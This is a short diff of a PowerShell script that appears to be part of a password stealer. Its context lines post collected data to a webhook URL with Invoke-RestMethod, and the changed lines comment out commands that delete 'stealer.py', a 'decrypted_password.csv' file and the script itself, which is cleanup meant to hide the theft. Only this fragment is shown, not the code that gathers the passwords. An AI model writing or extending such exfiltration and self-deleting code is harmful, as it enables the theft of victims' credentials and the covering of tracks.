@@ -43,8 +43,8 @@ $headers = @{
 
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
 
-Remove-Item stealer.py -Force
-Remove-item decrypted_password.csv -Force
-Remove-Item -Path $MyInvocation.MyCommand.Source
+#Remove-Item stealer.py -Force
+#Remove-item decrypted_password.csv -Force
+#Remove-Item -Path $MyInvocation.MyCommand.Source
 
 pause
